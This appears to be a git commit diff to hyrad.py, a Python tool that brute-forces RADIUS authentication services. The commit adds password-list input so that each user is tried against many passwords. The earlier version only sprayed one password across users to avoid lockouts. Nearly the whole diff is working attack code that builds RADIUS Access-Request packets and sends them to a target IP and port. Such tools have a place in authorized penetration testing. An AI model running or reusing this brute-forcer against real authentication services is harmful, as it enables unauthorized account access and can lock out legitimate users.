6981f41610da1a51355a7f1bf87b993015de00da
Ping <github@studioph.co>
2017-03-31 23:09:33 -0400

    added ability to read a password file

--- hyrad.py
+++ hyrad.py
@@ -52,48 +52,44 @@ def enc_pass(shared_key, authenticator, password):
     return final
 
 
-def brute(user_obj):
-    idx = user_obj["idx"]
-    user = user_obj["val"]
+def brute(user):
 
     RADIUS_CODE = "\x01" # access-request - https://en.wikipedia.org/wiki/RADIUS#Packet_structure
-
     AUTHENTICATOR = "\x20\x20\x20\x20\x20\x20\x31\x34\x38\x35\x33\x37\x35\x35\x36\x33"
 
-    pack_id = int_to_hex(idx%256)
+    for idx, pwd in enumerate(allpasses):
+        pack_id = int_to_hex(idx%256)
 
-    # generate password related fields
-    AVP_PWD_TYPE = "\x02"
-    encrypted = enc_pass(args.secret, AUTHENTICATOR, args.password)
-    avp_pwd_len = len(encrypted) + len(AVP_PWD_TYPE) + 1 # reserve 1B for the length field itself
-    avp_pwd_len_hex = int_to_hex(avp_pwd_len%256) # 256 = 2^8 = 1 byte available for length
+        # generate password related fields
+        AVP_PWD_TYPE = "\x02"
+        encrypted = enc_pass(args.secret, AUTHENTICATOR, pwd)
+        avp_pwd_len = len(encrypted) + len(AVP_PWD_TYPE) + 1 # reserve 1B for the length field itself
+        avp_pwd_len_hex = int_to_hex(avp_pwd_len%256) # 256 = 2^8 = 1 byte available for length
 
-    # generate user related fields
-    AVP_UNAME_TYPE = "\x01"
-    avp_uname_len = len(user) + len(AVP_UNAME_TYPE) + 1 # reserve 1B for the length field itself
-    avp_uname_len_hex = int_to_hex(avp_uname_len%256) # 256 = 2^8 = 1 byte available for length
+        # generate user related fields
+        AVP_UNAME_TYPE = "\x01"
+        avp_uname_len = len(user) + len(AVP_UNAME_TYPE) + 1 # reserve 1B for the length field itself
+        avp_uname_len_hex = int_to_hex(avp_uname_len%256) # 256 = 2^8 = 1 byte available for length
 
-    pkt_len = avp_pwd_len + avp_uname_len + len(AUTHENTICATOR) + len(pack_id) + len(RADIUS_CODE) + 2 # reserve 2B for the length field itself
-    pkt_len_hex = int_to_hex(pkt_len%65536, 2) # 65536 = 2^16 = 2 bytes available for length
+        pkt_len = avp_pwd_len + avp_uname_len + len(AUTHENTICATOR) + len(pack_id) + len(RADIUS_CODE) + 2 # reserve 2B for the length field itself
+        pkt_len_hex = int_to_hex(pkt_len%65536, 2) # 65536 = 2^16 = 2 bytes available for length
 
-    # send it
-    socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, args.port))
-
+        # send it
+        socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, args.port))
 
 # parse arguments
 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, 
     description=textwrap.dedent('''\
-        %sHyRad - v0.1
-        An utility tool to brute force authentication service using Radius protocol.
-        As many Radius protocol would lock accounts out after a limited number of tries,
-        this tool focuses on trying one password against a list of users to prevent accidental mass lockout.%s
+        %sHyrad - v0.2
+        An utility tool to brute force authentication service using Radius protocol.%s
     ''' % (bcolors.OKGREEN, bcolors.ENDC)))
 
 parser.add_argument('ip', metavar="IP", help="Required. The IP address where the radius service is running")
 parser.add_argument('-P', '--port', dest="port", help="The port of the radius service. Default 1812", default=1812)
-parser.add_argument('-p', '--password', dest="password", help="The password to be used.", required=True)
-parser.add_argument('-u', '--username', dest="user", help="The username to be used. Will be tried if set regardless whether --users is defined")
-parser.add_argument('-U', '--users', dest="users", help="The list of users to be tried with the provided password")
+parser.add_argument('-u', '--username', dest="user", help="The username to be used.")
+parser.add_argument('--userlist', dest="userlist", help="The list of users to be used.")
+parser.add_argument('-p', '--password', dest="password", help="The list of password to be used.")
+parser.add_argument('--passlist', dest="passlist", help="The list of passwords to be tried.")
 parser.add_argument('-s', '--secret', dest="secret", help="Required. The shared secret to be used", required=True)
 parser.add_argument('-t', '--thread', dest="thread", help="The number of threads to be used", default=4)
 
@@ -101,8 +97,8 @@ args = parser.parse_args()
 
 # get the final list of users to try
 allusers = []
-if args.users is not None:
-    with open(args.users) as f:
+if args.userlist is not None:
+    with open(args.userlist) as f:
         allusers = f.readlines()
 
 if args.user is not None:
@@ -114,7 +110,23 @@ if len(allusers) == 0:
     sys.exit(2)
 
 # rid of new lines etc
-allusers = [{"idx": idx, "val": x.strip()} for (idx, x) in enumerate(allusers)] 
+allusers = [x.strip() for x in allusers] 
+
+# get the final list of passwords
+allpasses = []
+if args.passlist is not None:
+    with open(args.passlist) as f:
+        allpasses += f.readlines()
+
+if args.password is not None:
+    allpasses += [args.password]
+
+if len(allpasses) == 0:
+    print "\n\n%sNo password was provided. Quitting%s\n\n"%(bcolors.FAIL, bcolors.ENDC)
+    parser.print_help()
+    sys.exit(2)
+
+allpasses = [x.strip() for x in allpasses] 
 
 # prepare socket
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
